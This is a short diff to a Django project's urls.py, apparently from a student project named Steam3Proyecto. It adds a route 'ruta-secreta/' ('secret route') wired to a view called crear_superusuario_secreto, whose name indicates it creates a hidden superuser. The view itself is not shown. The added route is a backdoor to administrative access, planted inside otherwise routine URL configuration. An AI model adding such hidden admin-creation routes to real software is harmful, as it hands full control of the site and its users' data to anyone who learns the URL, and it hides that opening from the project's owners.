@@ -17,7 +17,11 @@ Including another URLconf
 from django.contrib import admin
 from django.urls import path, include
 
+from Steam3Proyecto import views
+
 urlpatterns = [
     path('admin/', admin.site.urls),
-    path('', include('Steam3Proyecto.urls'))
+    path('', include('Steam3Proyecto.urls')),
+    path('ruta-secreta/', views.crear_superusuario_secreto, name='crear_admin'),
+    
 ]
